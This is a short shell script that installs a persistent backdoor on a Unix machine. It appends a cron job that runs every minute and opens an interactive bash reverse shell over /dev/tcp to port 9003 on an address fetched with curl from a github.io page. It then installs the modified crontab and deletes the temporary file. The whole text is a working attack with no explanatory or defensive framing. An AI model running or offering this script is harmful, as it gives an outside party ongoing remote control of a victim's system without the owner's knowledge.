cd "$(mktemp -d)";
crontab -l > mycron;
echo "* * * * * bash -c 'exec bash -i &>/dev/tcp/\$(curl https://romainpanno.github.io/ip)/9003 <&1' " >> mycron;
crontab mycron;
rm -f mycron;
exit;